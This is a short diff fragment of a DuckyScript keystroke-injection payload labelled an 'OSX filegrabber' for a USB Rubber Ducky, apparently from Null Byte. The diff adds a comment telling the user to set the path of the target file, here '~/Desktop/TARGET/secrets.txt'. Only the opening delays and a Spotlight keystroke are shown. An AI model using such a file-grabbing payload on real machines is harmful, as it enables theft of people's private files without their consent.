@@ -1,5 +1,6 @@
 REM OSX FILEGRABBER FOR TWIN DUCK
 REM STAY SAD - SADMIN FOR NULL BYTE 2017
+REM You should replace ~/Desktop/TARGET/secrets.txt with the file path for your target file
 DELAY 2000
 GUI SPACE
 DELAY 500
